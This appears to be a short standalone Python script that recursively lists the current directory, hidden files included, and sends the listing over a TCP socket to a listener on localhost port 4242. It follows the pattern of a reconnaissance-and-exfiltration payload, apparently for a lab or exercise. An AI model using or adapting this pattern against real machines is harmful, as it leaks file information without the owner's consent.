#!/usr/bin/python3

import socket
import subprocess

out, err = subprocess.Popen(["ls", "-Rla"], stdout=subprocess.PIPE).communicate()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4242))
s.send(out)
